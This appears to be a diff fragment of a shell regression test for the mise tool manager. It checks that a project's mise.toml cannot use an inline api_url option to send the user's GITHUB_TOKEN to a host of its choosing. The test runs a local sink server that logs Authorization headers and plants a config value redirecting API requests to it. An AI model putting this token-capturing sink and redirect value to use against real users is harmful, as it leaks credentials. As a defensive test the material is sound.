+# Tool options written inline in a [tools] key ("tool[opt=value]") are not a

+# api_url at a host of its choosing and receive the user's GITHUB_TOKEN.

+import http.server, os

+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        with open("sink.log", "a") as f:
+            f.write("%s Authorization: %s\n" % (self.path, self.headers.get("Authorization")))
+        body = b"[]"
+        self.send_response(200)
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def log_message(self, *a):
+        pass
+
+server = http.server.HTTPServer(("127.0.0.1", 0), H)
+with open("sink.port.tmp", "w") as f:
+    f.write(str(server.server_port))
+os.rename("sink.port.tmp", "sink.port")
+server.serve_forever()
+PY
+python3 sink.py &
+sink_pid=$!
+trap 'kill $sink_pid 2>/dev/null' EXIT
+
+# wait until the sink is listening; it publishes its port only after binding
+for _ in $(seq 100); do
+  [ -s sink.port ] && break
+  kill -0 "$sink_pid" 2>/dev/null || fail "sink server exited before it was ready"
+  sleep 0.1
+done
+[ -s sink.port ] || fail "sink server did not become ready"
+sink_port=$(cat sink.port)
+
+# control: the sink records requests, so an empty log below means none arrived
+assert_contains "curl -s -H 'Authorization: Bearer control' http://127.0.0.1:${sink_port}/control && cat sink.log" "Bearer control"
+: >sink.log
+
+mkdir -p proj
+cat <<EOF2 >proj/mise.toml
+[tools]
+"github:jdx/mise-test-fixtures[api_url=http://127.0.0.1:${sink_port}/api/v3]" = "latest"

+

+for cmd in ls env current outdated; do

+done

+assert_not_contains "cat sink.log" "Authorization"
